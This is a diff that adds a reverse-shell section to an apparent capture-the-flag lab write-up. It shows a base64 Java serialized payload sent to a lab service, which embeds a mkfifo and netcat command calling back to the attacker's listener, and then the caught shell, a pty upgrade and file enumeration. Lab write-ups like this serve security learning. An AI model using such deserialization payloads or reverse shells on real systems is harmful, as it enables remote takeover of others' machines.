@@ -397,3 +397,60 @@ abc : rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZz
 
 ![image](Images/Screenshot%20From%202026-07-13%2001-03-58.png)
 
+
+---
+
+## Reverse Shell
+
+> Now let's test this with the service running on port 3333
+
+```shell
+┌──(root㉿kali)-[~]
+└─# nc cave.thm 3333
+You find yourself in a cave, what do you do?
+action.php?<xml>rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB%2bAAFMAAZvdXRwdXRxAH4AAXhwdABgdHJ5aW5nIjtybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjE1Mi4zNSA0NDQ0ID4vdG1wL2Y7ZWNobyAidAADYWJjdAAA</xml>
+
+<Response Hanging>
+```
+
+> Tab 2:
+
+```shell
+┌──(root㉿kali)-[~]
+└─# rlwrap nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.152.35] from (UNKNOWN) [10.128.152.11] 32776
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+cave@cave:~/src$ id               id
+id
+uid=1000(cave) gid=1000(cave) groups=1000(cave)
+cave@cave:~/src$ 
+```
+
+> Objective 1: Complete
+
+```bash
+cave@cave:~$ ls -la       ls -la
+ls -la
+total 48
+drwxr-xr-x 1 cave cave 4096 Aug 28  2020 .
+drwxr-xr-x 1 root root 4096 Aug 27  2020 ..
+lrwxrwxrwx 1 cave cave    9 Aug 27  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 cave cave  220 Aug 21  2020 .bash_logout
+-rw-r--r-- 1 cave cave 3771 Aug 21  2020 .bashrc
+drwx------ 2 cave cave 4096 Aug 21  2020 .cache
+drwxrwxr-x 3 cave cave 4096 Aug 24  2020 .local
+-rw-r--r-- 1 cave cave  807 Aug 21  2020 .profile
+-rw-rw-r-- 1 cave cave  286 Aug 28  2020 info.txt
+drwxr-xr-x 1 cave cave 4096 Aug 26  2020 src
+cave@cave:~$ cat info.txt cat info.txt
+cat info.txt
+After getting information from external entities, you saw that one part of the wall was different from the rest, when touching it, it revealed a wooden door without a keyhole.
+On the door it is carved the following statement:
+
+              The password is in
+        ^ed[h#f]{3}[123]{1,2}xf[!@#*]$
+
+cave@cave:~$ 
+```
